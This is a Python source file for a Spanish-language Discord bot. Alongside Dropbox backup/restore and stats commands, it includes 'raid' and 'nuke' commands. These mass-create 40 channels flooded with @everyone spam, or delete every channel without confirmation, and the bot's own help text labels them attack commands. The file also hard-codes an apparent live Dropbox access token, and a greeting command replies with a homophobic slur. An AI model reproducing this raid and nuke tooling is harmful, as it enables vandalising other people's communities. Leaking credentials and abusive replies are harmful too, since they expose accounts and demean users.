import discord
from discord.ext import commands
import json
import aiohttp
import dropbox
import time
import asyncio
from io import BytesIO

DROPBOX_TOKEN = "sl.u.AGKZXBEDby-WSY6Wy-vxI-5wh-FlvO-oacPU6vIx1WtvElxJk6LnVEbHm0Nij0KLFB7pO3KtczNmQ1n9Pm0T-gYbEJJw2QIpQ8INlfDvs45LyfoeJl-zkph3WqBoEGiR3jKAUFLHGyEpphFYrG69-9S9PpUosay6ETrE55NK-gr1PfnTdY_v3NPVkcEwaICy0-wtXYr06mmuZyow6dvOeP0Okn3SFGV7szJrL2YLX0X-x2S5sbJyW6m9j4IPRbiz7uZUFcUx_MRoHeGdw_v7Yl4hDnWmsbaFNmY_PY1dResiz9K9sNY2JuSoPBm2hH-aP4YX-TDenIvAwM9-EQlbKGYubz2sFdo7FvuP44uMIm0l2GVSJ2ZgoIPtriKeEds_bJv4xXZ_dXAdwpTYcKCzRBrWcCilpHVDdBTcDY5mo3XO45Qs67Le4S61IaXohLYlnZAmTcmiGN2tEbJfjBSxC1XSXNXceqYWyVTfDLt40rZ_2UusiROjAwiTvLbBiAP92MhVmOqPS1b2dLRoPXxd_K8Of9XPxJ8Vjn4nygyxzCtYMZWP6IZj3RMItIlsivWP8APw9KbwA8Nlw5lcBtF-T6kKzJm8WHNUQMKad6DFtruoFzEhde9bPDxv2crcMKiXK24JeEgzFdmVZc8CSubZGtyXppRWzpo5iuUCyi4LNAIbMAjLTS95dYKhYkwv7aIyT_bMC4GSf7R5V59Ms1yuqfEpMiGeN5qt0-usJMhpcavHf7cnj_LTimeMits8pJbsUvXdzMf4LEMMr6R2LzBqDLrgE78VOVy-ptHrBDkiZut63RtuUkknujila-2R3FefD7BYYA9kP807mmYYlfIycTIqU9FrwUyAaU2sVlniddT2rHs4mEd5M6IUOqoJ_bU-IYUUdlgdG1baRJ_T61oBHjWIM7PopjSn9l9r_RPHGeoHE7-KuyAtd4ElUwAN7_hbgGD4GVhbuA45BCJMIbP7wiMtktS0jWTdTUlPUN14uZeGywAu2vG7aIEn_9Y2dcWOHndcqaT6L9iaXNcma5o3VicfvY3UfLZPdXN3hNGW07Kh1Rl1Mw8oYmDwP6piSuGDCnd9rQ8ZwHLtwjYb8h6BCaHgsYgon_1uNJEVhiLx_rnfFDtV27mduigUqiU1-5bA6u1raEzghssHdTiY2iz-Cytg8chCdOhWdn1vx07HzJ_JiQRWWzloH0D48LLPWx82rNj1rPOCWnO7QOCtf81i2B7p6dadg_KE5Xv3Tt3rf85VZYkUnYEcmiZ1nQtiT1-vr8_K3bRWkbNB4FATDPk67m6bWV2zXX2_9M7Ylea38lRullgT6jwd4PGSgMe_4yrpK-Z5IH6fE1TC1peUXHx0sqFTpEz-QJN9u-oEiiuqBjuvwfUTJZC7YQIr8YFefcSvEAE"  # <- Pon aquí tu token
dbx = dropbox.Dropbox(DROPBOX_TOKEN)

with open("secrets.json") as f:
    data = json.load(f)
TOKEN = data["TOKEN"]

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents, case_insensitive=True)

@bot.event
async def on_ready():
    print(f"Bot conectado como {bot.user}")

@bot.command()
async def hola(ctx):
    await ctx.send("Que queres gey de mrd?")


@bot.command()
@commands.has_permissions(manage_channels=True)
async def borrar_categoria(ctx, nombre):
    for canal in ctx.guild.channels:
        if nombre.lower() in canal.name.lower():
            await canal.delete()
    await ctx.send(f"Canales que contenían '{nombre}' fueron borrados.")

# ----------------------------
# Comando para guardar backup en Dropbox
# ----------------------------
@bot.command()
@commands.has_permissions(administrator=True)
async def guardar_backup(ctx, nombre):
    guild = ctx.guild

    # Verificar si ya existe backup en Dropbox
    try:
        dbx.files_get_metadata(f"/{nombre}.json")
        await ctx.send(f"❌ Ya existe un backup con el nombre '{nombre}'. Elige otro nombre.")
        return
    except dropbox.exceptions.ApiError:
        pass  # No existe, podemos crear

    # Crear diccionario con toda la info
    backup = {
        "nombre": guild.name,
        "descripcion": guild.description,
        "icon_url": str(guild.icon.url) if guild.icon else None,
        "roles": [{"name": r.name, "color": r.color.value, "hoist": r.hoist} for r in guild.roles if r.name != "@everyone"],
        "categorias": [{"name": c.name, "id": c.id} for c in guild.categories],
        "canales": [{"name": ch.name,
                     "type": ch.type.name,
                     "topic": getattr(ch, "topic", None),
                     "category_id": ch.category.id if ch.category else None} for ch in guild.channels]
    }

    # Convertir a bytes y subir a Dropbox
    json_bytes = json.dumps(backup, ensure_ascii=False, indent=4).encode("utf-8")
    dbx.files_upload(json_bytes, f"/{nombre}.json")
    await ctx.send(f"✅ Backup '{nombre}' guardado en Dropbox con éxito!")

# ----------------------------
# Comando para restaurar backup desde Dropbox
# ----------------------------
@bot.command()
@commands.has_permissions(administrator=True)
async def restaurar_backup(ctx, nombre):
    # Descargar backup de Dropbox
    try:
        metadata, res = dbx.files_download(f"/{nombre}.json")
        backup = json.loads(res.content)
    except dropbox.exceptions.ApiError:
        await ctx.send(f"❌ No se encontró el backup '{nombre}' en Dropbox")
        return

    guild = ctx.guild
    await ctx.send("⏳ Eliminando roles y canales existentes...")

    # Borrar roles (excepto @everyone)
    for rol in guild.roles:
        if rol.name != "@everyone":
            try:
                await rol.delete()
            except:
                pass

    # Borrar canales existentes
    for canal in guild.channels:
        try:
            await canal.delete()
        except:
            pass

    await ctx.send("🗑️ Roles y canales eliminados. Restaurando backup...")

    # Restaurar nombre, descripción e icono
    icon_bytes = None
    if backup.get("icon_url"):
        async with aiohttp.ClientSession() as session:
            async with session.get(backup["icon_url"]) as resp:
                if resp.status == 200:
                    icon_bytes = await resp.read()

    try:
        await guild.edit(
            name=backup["nombre"],
            description=backup.get("descripcion"),
            icon=icon_bytes
        )
    except:
        pass

    # Restaurar roles
    for r in backup["roles"]:
        try:
            await guild.create_role(
                name=r["name"],
                color=discord.Color(r["color"]),
                hoist=r.get("hoist", False)
            )
        except:
            pass

    # Restaurar categorías
    categorias_nuevas = {}
    for c in backup["categorias"]:
        try:
            nueva_cat = await guild.create_category(name=c["name"])
            categorias_nuevas[c["id"]] = nueva_cat
        except:
            pass

    # Restaurar canales
    for ch in backup["canales"]:
        categoria = categorias_nuevas.get(ch["category_id"])
        try:
            if ch["type"] == "text":
                await guild.create_text_channel(
                    name=ch["name"],
                    topic=ch.get("topic"),
                    category=categoria
                )
            elif ch["type"] == "voice":
                await guild.create_voice_channel(
                    name=ch["name"],
                    category=categoria
                )
        except:
            pass

    await ctx.send(f"🎉 Backup '{nombre}' restaurado y servidor reemplazado con éxito!")

@bot.command()
async def stats(ctx):
    start_time = time.time()
    # Mandar mensaje temporal para medir delay
    temp = await ctx.send("⏱ Calculando...")
    delay = (time.time() - start_time) * 1000  # en milisegundos

    embed = discord.Embed(
        title="📊 Estadísticas del Bot",
        color=discord.Color.green()
    )
    embed.add_field(name="Ping (Websocket)", value=f"{round(bot.latency*1000)} ms😵‍💫", inline=True)
    embed.add_field(name="Delay (respuesta)", value=f"{int(delay)} ms😛", inline=True)
    embed.add_field(name="Lenguaje", value="Python🐍", inline=True)
    embed.add_field(name="Servidores", value=f"{len(bot.guilds)}📸", inline=True)
    embed.set_footer(text=f"Bot creado por Whatvixx📩")
    
    await temp.edit(content=None, embed=embed)

@bot.command(name='raid', aliases=['simultaneous_nuke'])
@commands.has_permissions(administrator=True, manage_channels=True)
async def concurrent_spam_channels(ctx):
    """Crea y spamea 40 canales simultáneamente."""
    
    # --- CONFIGURACIÓN DE PARÁMETROS (MOVIMOS AQUÍ) ---
    NUM_CANALES = 40
    MENSAJES_POR_CANAL = 20
    NOMBRE_BASE = "raiddddd"
    CONTENIDO_MENSAJE = "ÚNANSE A SERDÁN PUTAAS @everyone"
    # -------------------------------------------------
    
    await ctx.send(
        f"🚀 **Modo Concurrente Activado:** Creando **{NUM_CANALES}** canales y enviando spam **simultáneamente**."
    )
    
    # Crear una lista de tareas (corutinas) para ejecutar
    tasks = []
    for i in range(1, NUM_CANALES + 1):
        nombre_canal = f"{NOMBRE_BASE}-{i:02d}"
        
        # Añadir la tarea de crear y spamear un canal a la lista
        # La función 'create_and_spam_single_channel' debe estar definida ANTES de este punto
        # o en un lugar que Python pueda acceder. Aquí la pondremos después del comando.
        tasks.append(
            create_and_spam_single_channel(ctx.guild, nombre_canal, MENSAJES_POR_CANAL, CONTENIDO_MENSAJE)
        )

    # Ejecutar todas las tareas de forma concurrente
    results = await asyncio.gather(*tasks, return_exceptions=True)

    # Contar los canales creados con éxito
    canales_exitosos = sum(1 for result in results if result == 1)
    
    # Mensaje final
    if canales_exitosos > 0:
        await ctx.send(f"✅ **¡Operación Concurrente Finalizada!**\n"
                       f"Completados con éxito (Creación y Spam): **{canales_exitosos}** canales.")
    else:
        await ctx.send("⚠️ No se pudo completar ninguna tarea con éxito. Revisa logs y permisos.")

# -------------------------------------------------------------------
# ⚙️ LÓGICA Y FUNCIONES (TODO EL CÓDIGO DEBAJO DEL COMANDO)
# -------------------------------------------------------------------

async def create_and_spam_single_channel(guild, nombre_canal, num_mensajes, contenido_mensaje):
    """Función que gestiona la creación y el spam de un solo canal de forma asíncrona."""
    try:
        # 1. CREAR CANAL
        nuevo_canal = await guild.create_text_channel(name=nombre_canal)
        print(f"Canal creado: {nombre_canal}")

        # 2. ENVIAR MENSAJES EN MASA (También de forma concurrente)
        await nuevo_canal.send(f"**-- Iniciando spam de {num_mensajes} mensajes --**")
        
        # Lanzar todas las tareas de envío de mensajes de este canal a la vez
        spam_tasks = [nuevo_canal.send(contenido_mensaje) for _ in range(num_mensajes)]
        await asyncio.gather(*spam_tasks) 
        
        print(f"Spam completado en {nombre_canal}")
        
        return 1 
        
    except discord.Forbidden:
        print(f"🚫 Error de permisos al procesar {nombre_canal}")
        return 0
    except discord.HTTPException as e:
        print(f"❌ Error HTTP (Rate Limit probable) al procesar {nombre_canal}: {e}")
        return 0

@bot.command(name='nuke', aliases=['eliminar-canales', 'delall'])
@commands.has_permissions(administrator=True, manage_channels=True)
async def nuke_channels(ctx):
    """
    Elimina todos los canales del servidor inmediatamente, 
    excepto el canal actual, sin pedir confirmación.
    """
    
    # ⚠️ Advertencia inicial antes de comenzar la acción
    await ctx.send("🚨 **¡ATENCIÓN!** Eliminación masiva de canales iniciada. Esto es **IRREVERSIBLE**.")

    deleted_count = 0
    
    # 🔄 Recorrer todos los canales en el servidor
    for channel in ctx.guild.channels:
        # 🛑 No eliminar el canal donde se ejecutó el comando para poder enviar el mensaje final
        if channel.id == ctx.channel.id:
            continue
        
        try:
            # 🔥 Ejecutar la eliminación del canal
            await channel.delete()
            deleted_count += 1
            print(f"Canal eliminado: {channel.name}")
        except discord.Forbidden:
            print(f"🚫 No tengo permisos para eliminar el canal: {channel.name}")
        except discord.HTTPException as e:
            print(f"❌ Error al eliminar el canal {channel.name}: {e}")

    # 🎉 Mensaje final de éxito en el canal actual
    await ctx.send(f"✅ **¡Operación completada!** Se eliminaron **{deleted_count}** canales.")

@bot.command(name='ayuda', aliases=['comandos'])
async def help_command(ctx):
    """Muestra una lista de todos los comandos de ataque en un Embed."""
    
    # 📝 Crear el objeto Embed
    embed = discord.Embed(
        title="🚨 Lista de Comandos de Operaciones Masivas",
        description="Todos los comandos requieren el permiso de **Administrador** (`administrator=True`).",
        color=0xFF0000 # Color rojo para peligro/advertencia
    )
    
    # --- 1. Comando de Eliminación Masiva ---
    embed.add_field(
        name="💥 !nuke",
        value="**Aliases:** `!eliminar-canales`, `!delall`\n"
              "**Función:** Elimina **todos los canales** del servidor al instante, sin confirmación. Solo deja el canal de ejecución.\n"
              "**Ejecución:** `!nuke`",
        inline=False
    )
    
    # --- 2. Comando de Creación y Spam Concurrente ---
    embed.add_field(
        name="🚀 !raid",
        value="**Aliases:** `!simultaneous_nuke`\n"
              "**Función:** Crea **40 canales** (`test-01` a `test-40`) y envía **20 mensajes de 'hola'** en cada uno de forma **simultánea**.\n"
              "**Ejecución:** `!concurrent_spam`",
        inline=False
    )
    
    # 📢 Añadir un pie de página
    embed.set_footer(text="⚠️ Usa estos comandos bajo tu propia responsabilidad. Son acciones IRREVERSIBLES.")
    
    # Enviar el Embed al canal
    await ctx.send(embed=embed)

bot.run(TOKEN)
